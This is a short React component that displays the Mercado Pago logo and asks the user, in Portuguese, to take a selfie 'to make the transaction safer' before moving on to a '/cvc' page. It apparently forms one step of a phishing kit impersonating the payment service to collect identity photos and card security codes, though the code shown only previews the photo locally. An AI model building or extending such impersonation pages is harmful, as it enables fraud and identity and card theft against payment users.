import React, {Component} from 'react';
import { Link } from 'react-router-dom';

import Logo from '../../assets/mercado-pago.svg';

import { Container, Topo, Inputs } from './styles';

class Segunda extends Component {
  constructor(props){
    super(props)
    this.state = {
      file: null,
    }
    this.handleChangeFile1 = this.handleChangeFile1.bind(this)
  }

  handleChangeFile1(event) {
    this.setState({
      file: URL.createObjectURL(event.target.files[0])
    })
  }

  render() {
      return (
        <Container>
          <Topo>
            <img src={Logo} alt=""/>
          </Topo>

          <h1>Confirme que é você.</h1>
          <p>Tire uma foto sua. Isso vai nos ajudar tornar a sua transação mais segura.</p>

          <Inputs>
            <img width={"150px"} src={this.state.file}/>
            <input type="file" accept="image/*" capture="camera" onChange={this.handleChangeFile1}/>

            <Link to="/cvc"><button>Enviar</button></Link>
          </Inputs>
        </Container>
      )
  }
}

export default Segunda;
